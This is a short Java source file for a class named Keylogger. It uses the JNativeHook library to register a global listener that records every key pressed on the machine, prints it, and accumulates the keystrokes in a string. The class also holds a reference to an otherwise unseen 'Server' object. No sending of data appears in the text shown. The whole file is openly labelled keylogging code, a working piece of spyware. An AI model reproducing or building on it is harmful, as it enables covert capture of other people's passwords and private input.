package Test;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {
    Server c ;
    String key = "";
    public Keylogger(Server c)
    {
        this.c = c;
    }
    public void nativeKeyTyped(NativeKeyEvent nativeEvent) {

    }

    public void nativeKeyPressed(NativeKeyEvent nativeEvent) {
        System.out.println("Press: "+ NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));

        key= key + NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()) +"\n";

    }

    public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
    }
}
